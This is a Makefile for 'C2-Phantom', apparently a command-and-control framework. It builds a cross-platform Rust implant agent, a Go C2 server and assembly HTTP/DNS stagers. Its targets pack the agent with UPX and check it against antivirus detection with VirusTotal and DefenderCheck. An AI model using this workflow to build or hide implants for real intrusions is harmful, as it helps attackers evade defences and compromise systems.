# C2-Phantom Multi-Language Build System
# Builds C core, Rust agent, Go server, Assembly stagers

.PHONY: all clean core agent server stagers test install

# Default target
all: core agent server stagers

# Build C core libraries
core:
	@echo "Building C core libraries..."
	@mkdir -p build
	cd build && cmake -DCMAKE_BUILD_TYPE=Release .. && cmake --build . --config Release
	@echo "✓ C core build complete"

# Build Rust agent
agent:
	@echo "Building Rust agent..."
	cd agent && cargo build --release --target x86_64-pc-windows-gnu
	cd agent && cargo build --release --target x86_64-unknown-linux-musl
	@echo "✓ Rust agent build complete"
	@echo "  Windows: agent/target/x86_64-pc-windows-gnu/release/c2-agent.exe"
	@echo "  Linux: agent/target/x86_64-unknown-linux-musl/release/c2-agent"

# Build Go server
server:
	@echo "Building Go C2 server..."
	cd server && go build -o ../build/c2-server
	@echo "✓ Go server build complete: build/c2-server"

# Build Assembly stagers
stagers:
	@echo "Building Assembly stagers..."
	@mkdir -p build/stagers
	nasm -f win64 stager/http_stager.asm -o build/stagers/http_stager.bin
	nasm -f win64 stager/dns_stager.asm -o build/stagers/dns_stager.bin
	@echo "✓ Assembly stagers build complete"

# Run tests
test: core
	@echo "Running C tests..."
	cd build && ctest --output-on-failure
	@echo "Running Rust tests..."
	cd agent && cargo test
	@echo "Running Go tests..."
	cd server && go test ./...
	@echo "✓ All tests passed"

# Install binaries
install: all
	@echo "Installing binaries..."
	@mkdir -p /opt/c2-phantom/bin
	@mkdir -p /opt/c2-phantom/lib
	cp build/c2-server /opt/c2-phantom/bin/
	cp agent/target/x86_64-pc-windows-gnu/release/c2-agent.exe /opt/c2-phantom/bin/
	cp agent/target/x86_64-unknown-linux-musl/release/c2-agent /opt/c2-phantom/bin/
	cp build/lib*.a /opt/c2-phantom/lib/ || true
	cp build/stagers/*.bin /opt/c2-phantom/bin/
	@echo "✓ Installation complete: /opt/c2-phantom"

# Clean build artifacts
clean:
	@echo "Cleaning build artifacts..."
	rm -rf build
	cd agent && cargo clean
	cd server && go clean
	@echo "✓ Clean complete"

# Development mode (with debug symbols)
dev:
	@echo "Building in development mode..."
	@mkdir -p build
	cd build && cmake -DCMAKE_BUILD_TYPE=Debug .. && cmake --build . --config Debug
	cd agent && cargo build
	cd server && go build -o ../build/c2-server
	@echo "✓ Development build complete"

# Cross-compile for all platforms
cross-compile:
	@echo "Cross-compiling for all platforms..."
	# Windows
	cd agent && cargo build --release --target x86_64-pc-windows-gnu
	cd agent && cargo build --release --target i686-pc-windows-gnu
	# Linux
	cd agent && cargo build --release --target x86_64-unknown-linux-musl
	cd agent && cargo build --release --target i686-unknown-linux-musl
	# macOS (requires osxcross)
	# cd agent && cargo build --release --target x86_64-apple-darwin
	@echo "✓ Cross-compilation complete"

# Static analysis
lint:
	@echo "Running static analysis..."
	cd agent && cargo clippy -- -D warnings
	cd server && golangci-lint run
	@echo "✓ Lint complete"

# Generate documentation
docs:
	@echo "Generating documentation..."
	cd agent && cargo doc --no-deps
	cd server && godoc -http=:6060 &
	@echo "✓ Documentation generated"
	@echo "  Rust: agent/target/doc/index.html"
	@echo "  Go: http://localhost:6060"

# Size optimization
optimize:
	@echo "Optimizing binary sizes..."
	cd agent && cargo build --release --target x86_64-pc-windows-gnu
	strip agent/target/x86_64-pc-windows-gnu/release/c2-agent.exe || true
	upx --best --lzma agent/target/x86_64-pc-windows-gnu/release/c2-agent.exe || true
	@echo "✓ Optimization complete"
	@ls -lh agent/target/x86_64-pc-windows-gnu/release/c2-agent.exe

# AV evasion check
av-check:
	@echo "Checking AV detection..."
	@echo "Upload to VirusTotal: agent/target/x86_64-pc-windows-gnu/release/c2-agent.exe"
	@echo "Run DefenderCheck: DefenderCheck.exe agent/target/x86_64-pc-windows-gnu/release/c2-agent.exe"

# Help
help:
	@echo "C2-Phantom Build System"
	@echo ""
	@echo "Targets:"
	@echo "  all              Build all components (default)"
	@echo "  core             Build C core libraries"
	@echo "  agent            Build Rust agent"
	@echo "  server           Build Go server"
	@echo "  stagers          Build Assembly stagers"
	@echo "  test             Run all tests"
	@echo "  install          Install binaries to /opt/c2-phantom"
	@echo "  clean            Remove build artifacts"
	@echo "  dev              Build in development mode"
	@echo "  cross-compile    Build for all platforms"
	@echo "  lint             Run static analysis"
	@echo "  docs             Generate documentation"
	@echo "  optimize         Optimize binary sizes"
	@echo "  av-check         Check AV detection"
	@echo "  help             Show this help message"
